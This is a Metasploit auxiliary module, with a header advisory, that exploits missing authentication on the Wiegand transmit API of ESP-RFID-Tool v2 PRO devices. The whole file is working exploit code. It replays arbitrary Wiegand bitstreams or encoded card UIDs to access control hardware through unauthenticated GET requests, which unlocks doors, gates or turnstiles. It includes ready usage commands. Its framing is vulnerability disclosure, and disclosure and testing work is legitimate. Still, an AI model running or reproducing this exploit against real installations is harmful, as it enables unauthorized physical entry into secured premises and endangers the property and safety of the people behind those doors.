##
# ESP-RFID-Tool v2 PRO — ESPR-01
# Unauthenticated Wiegand TX — Physical Access Control Bypass
#
# Researcher: Milan 't4c' Berger
# Advisory:   https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt
# Affected:   ESP-RFID-Tool v2 PRO <= v2.2.2 (all versions as of 2026-05-02)
# CVE:        Pending
#
# Description:
#   All Wiegand transmission API endpoints (/api/tx/bin, /api/txinstant/bin,
#   /api/wiegandencode) execute hardware TX operations without any
#   authentication check. Any attacker on the same network can replay arbitrary
#   Wiegand bitstreams to downstream access control hardware — unlocking
#   physical doors, gates, or secured areas — with a single unauthenticated
#   HTTP GET request.
#
# Usage:
#   use auxiliary/gather/esp_rfid_wiegand_replay
#   set RHOSTS 192.168.1.1
#   set BINARY 01001100110101010110101001
#   run
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'ESP-RFID-Tool v2 PRO — Unauthenticated Wiegand Replay (ESPR-01)',
        'Description'    => %q{
          Exploits missing authentication on all Wiegand TX API endpoints in
          ESP-RFID-Tool v2 PRO (<= v2.2.2). An unauthenticated attacker can
          replay arbitrary Wiegand bitstreams to physical access control hardware
          (doors, gates, turnstiles) via a single HTTP GET request.

          Supports three TX modes:
            - BINARY  : raw 0/1 bitstream via /api/tx/bin
            - INSTANT : same but fire-and-forget via /api/txinstant/bin
            - ENCODE  : UID hex + format via /api/wiegandencode (formats: 32, 34, 35)

          Discovered by Milan 't4c' Berger. Vendor notified 2026-04-27,
          deleted disclosure comment and blocked researcher. Full public
          disclosure 2026-04-28.
        },
        'Author'         => ['dRonin (tak47loss@mail.ru)'],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['URL', 'https://github.com/Einstein2150/ESP-RFID-Tool-v2'],
          ['URL', 'https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt'],
          ['Researcher', 'Milan "t4c" Berger']
        ],
        'DisclosureDate' => '2026-04-28',
        'Notes'          => {
          'Stability'  => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [PHYSICAL_EFFECTS]
        }
      )
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('BINARY',
        [false, 'Wiegand bitstream to replay (0/1 chars, optional comma separators)', '01001100110101010110101001']
      ),
      OptString.new('UID',
        [false, 'Card UID in hex (for ENCODE mode)', 'DEADBEEF']
      ),
      OptEnum.new('TXMODE',
        [true, 'TX mode: BINARY, INSTANT, ENCODE', 'BINARY', ['BINARY', 'INSTANT', 'ENCODE']]
      ),
      OptInt.new('FORMAT',
        [false, 'Wiegand format for ENCODE mode (32, 34, 35)', 32]
      ),
      OptInt.new('PULSEWIDTH',
        [false, 'Pulse width in microseconds', 40]
      ),
      OptInt.new('INTERVAL',
        [false, 'Data interval in microseconds', 2000]
      ),
      OptInt.new('WAIT',
        [false, 'Wait time in microseconds (BINARY mode only)', 100000]
      ),
    ])
  end

  def run_host(ip)
    mode = datastore['TXMODE']

    case mode
    when 'BINARY'
      path = "/api/tx/bin"
      params = {
        'binary'     => datastore['BINARY'],
        'pulsewidth' => datastore['PULSEWIDTH'].to_s,
        'interval'   => datastore['INTERVAL'].to_s,
        'wait'       => datastore['WAIT'].to_s
      }
    when 'INSTANT'
      path = "/api/txinstant/bin"
      params = {
        'binary'     => datastore['BINARY'],
        'pulsewidth' => datastore['PULSEWIDTH'].to_s,
        'interval'   => datastore['INTERVAL'].to_s
      }
    when 'ENCODE'
      path = "/api/wiegandencode"
      params = {
        'uid'    => datastore['UID'],
        'format' => datastore['FORMAT'].to_s
      }
    end

    print_status("#{ip} — Sending Wiegand TX via #{mode} mode (#{path})")
    print_status("#{ip} — Payload: #{mode == 'ENCODE' ? "UID=#{datastore['UID']} FORMAT=#{datastore['FORMAT']}" : datastore['BINARY']}")

    begin
      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => path,
        'vars_get' => params
      })

      if res.nil?
        print_error("#{ip} — No response (device may be offline or already fired)")
        return
      end

      if res.code == 200
        print_good("#{ip} — TX accepted (HTTP 200). Wiegand signal sent to downstream hardware.")
        print_status("#{ip} — Response body: #{res.body[0..255]}")

        report_vuln(
          host:        ip,
          port:        datastore['RPORT'],
          proto:       'tcp',
          name:        'ESP-RFID-Tool v2 PRO — Unauthenticated Wiegand TX (ESPR-01)',
          info:        "Replay of bitstream '#{datastore['BINARY']}' accepted without authentication",
          refs:        references
        )
      else
        print_warning("#{ip} — Unexpected response: HTTP #{res.code}")
        print_status("#{ip} — Body: #{res.body[0..255]}")
      end

    rescue ::Rex::ConnectionRefused
      print_error("#{ip} — Connection refused")
    rescue ::Rex::HostUnreachable
      print_error("#{ip} — Host unreachable")
    rescue ::Timeout::Error
      print_error("#{ip} — Connection timed out")
    end
  end
end
